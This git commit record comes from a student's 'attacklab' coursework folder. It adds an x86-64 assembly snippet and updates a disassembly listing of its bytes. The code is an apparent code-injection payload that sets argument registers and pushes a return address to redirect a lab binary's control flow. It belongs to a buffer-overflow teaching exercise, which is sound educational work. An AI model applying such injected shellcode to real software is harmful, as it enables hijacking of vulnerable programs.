fd1a490bae8276134bc4ff003ba482738f4129ce
Enes izgi <enesizgi@tutanota.com>
2021-12-16 00:50:12 +0300

    Phase 3 passed

---
+++ packages/331/attacklab/phase_2.s
@@ -0,0 +1,4 @@
+movq $0x49f9ebf9,%rdi
+movq $0x127e7afe, %rsi
+push $0x401649
+ret
--- packages/331/attacklab/test.d
+++ packages/331/attacklab/test.d
@@ -5,7 +5,7 @@ test.o:     file format elf64-x86-64
 Disassembly of section .text:
 
 0000000000000000 <.text>:
-   0:	48 c7 c7 f9 eb f9 49 	mov    $0x49f9ebf9,%rdi
-   7:	48 c7 c6 fe 7a 7e 12 	mov    $0x127e7afe,%rsi
-   e:	68 49 16 40 00       	push   $0x401649
-  13:	c3                   	ret    
+   0:	48 c7 c7 00 1b 68 55 	mov    $0x55681b00,%rdi
+   7:	48 c7 c6 10 1b 68 55 	mov    $0x55681b10,%rsi
+   e:	68 55 18 40 00       	pushq  $0x401855
+  13:	c3                   	retq   
